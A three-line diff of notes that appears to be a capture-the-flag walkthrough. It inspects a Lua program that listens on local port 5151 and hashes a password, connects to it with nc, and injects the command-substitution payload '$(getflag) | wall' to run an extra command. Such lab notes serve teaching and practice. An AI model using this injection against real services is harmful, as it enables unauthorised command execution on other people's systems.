@@ -1,0 +1,3 @@
+1.	open lua file and read code. The program bind the localhost to port 5151 and we can see that it hashes the pass and provides nothing if we find it or not
+2.	nc localhost <port>
+3.	$(getflag) | wall
